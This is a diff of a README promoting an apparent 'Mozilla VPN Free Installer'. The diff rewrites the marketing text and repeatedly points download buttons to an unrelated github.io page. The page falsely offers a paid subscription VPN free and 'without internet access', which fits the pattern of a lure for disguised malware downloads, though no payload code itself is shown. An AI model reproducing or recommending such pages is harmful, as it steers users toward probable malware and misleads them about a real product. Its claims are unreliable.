@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-VPN-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Mozilla VPN Free Installer** — Mozilla VPN is a VPN service from the makers of Firefox, powered by Mullvad's infrastructure. Works without internet access, no account required. Full offline installation.
+**💻 Mozilla VPN Free Installer** — Mozilla VPN is a privacy-focused VPN service from the makers of Firefox, powered by the Mullvad network with WireGuard protocol for fast, secure tunneling. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla%20VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla+VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Mozilla VPN
 
-Mozilla VPN is a VPN service from the makers of Firefox, powered by Mullvad's infrastructure. It offers a no-log policy, multi-hop connections, and simple interface — backed by Mozilla's trusted privacy reputation.
+Mozilla VPN is a privacy-focused VPN service from the makers of Firefox, powered by the Mullvad network with WireGuard protocol for fast, secure tunneling. Available for Windows, macOS, Linux, iOS, and Android, Mozilla VPN supports multi-hop connections and Device Management for protecting up to 5 devices. Mozilla's privacy commitment aligns with VPN use for users already trusting Firefox.
 
 ---
 
 ## ❌ Problem: Mozilla VPN is hard to access
 
-- **Subscription Required** — No free tier; monthly subscription required
-- **Limited Server Locations** — Fewer locations than major VPN providers
-- **Basic Feature Set** — Missing advanced features like split tunneling on all platforms
-- **Mullvad Infrastructure** — Powered by Mullvad; users may prefer Mullvad directly
+- **Subscription Required** — Monthly fee required
+- **Server Count** — Fewer server locations than major VPN providers
+- **Advanced Features** — Fewer power-user VPN features than specialized providers
+- **Limited Free Tier** — No free tier; subscription required from the start
 
 ---
 
@@ -81,7 +81,7 @@ Mozilla VPN is a VPN service from the makers of Firefox, powered by Mullvad's in
 
 <div align="center">
 
-[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla%20VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla+VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Mozilla VPN is a VPN service from the makers of Firefox, powered by Mullvad's in
 
 ---
 
-**Mozilla VPN Free Installer** — Mozilla VPN is a VPN service from the makers of Firefox, powered by Mullvad's infrastructure. Install without internet connection today!
+**Mozilla VPN Free Installer** — Mozilla VPN is a privacy-focused VPN service from the makers of Firefox, powered by the Mullvad network with WireGuard protocol for fast, secure tunneling. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla%20VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mozilla VPN](https://img.shields.io/badge/⬇_Install_Mozilla+VPN-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
